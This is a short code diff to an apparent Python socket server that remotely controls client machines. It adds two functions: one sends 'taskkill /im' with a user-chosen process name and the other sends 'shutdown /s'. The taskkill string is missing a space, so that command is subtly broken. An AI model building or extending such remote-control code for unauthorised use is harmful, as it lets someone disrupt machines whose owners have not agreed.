@@ -102,6 +102,28 @@ def services():
         output = output.decode()
         print('Output: ', output)
         break
+        
+def killtask():
+    while True:
+        procname = input('Enter Process Name: ')
+        command = 'taskkill /im' + procname
+        command = command.encode()
+        currConn.send(command)
+        print('Command sent to client: ', command)
+        
+        output = client.recv(8096)
+        output = output.decode()
+        print('Output: ', output)
+        break
+        
+def shutdown():
+    while True:
+        command = 'shutdown /s'
+        command = command.encode()
+        currConn.send(command)
+        print('Command sent to client: ', command)
+        break
+        
     
 if __name__ == '__main__':
     Main().run()
